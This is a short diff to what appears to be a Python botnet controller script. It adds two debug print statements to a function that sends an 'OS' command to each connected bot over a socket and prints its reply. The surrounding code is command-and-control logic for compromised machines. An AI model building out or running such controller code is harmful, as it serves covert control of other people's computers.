@@ -31,6 +31,8 @@ def detect_os():
     global botnet
     #Build a dictionary of botnet addresses and sock connections
     for bot in botnet:
+        print(str(bot))
+        print(str(botnet[bot]))
         botnet[bot].send("OS".encode())
         bot_os = botnet[bot].recv(1024).decode()
         print("Details for %s : "%(str(bot)))
